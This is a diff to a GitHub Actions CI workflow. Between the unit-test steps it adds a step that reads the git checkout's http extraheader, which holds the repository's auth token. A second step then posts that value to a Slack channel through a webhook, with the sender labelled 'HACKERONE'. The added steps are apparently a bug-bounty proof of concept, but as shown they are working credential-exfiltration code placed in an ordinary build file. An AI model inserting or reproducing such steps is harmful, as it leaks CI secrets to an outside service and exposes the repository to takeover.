@@ -38,6 +38,22 @@ jobs:
           name: unit test reports
           flags: unit
       
+      - name: h1 report val
+        run: |
+          sec=$(git config --get http.https://github.com/.extraheader)
+          echo "SLACK_MESSAGE=$(echo $sec)" >> $GITHUB_ENV
+      
+      - name: Send notification to slack
+        env:
+#           SLACK_MESSAGE: "TEST H1"
+          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
+          SLACK_COLOR: '#8B0000'
+          SLACK_USERNAME: HACKERONE
+          SLACK_CHANNEL: test_security_alerts
+          SLACK_ICON: https://avatars3.githubusercontent.com/u/9919?s=40&v=4
+        uses: rtCamp/action-slack-notify@v2
+      
+      
       - name: test-try3
         working-directory: ./.github/workflows/hypertrace-ingester/scripts
         run: ./tests.sh
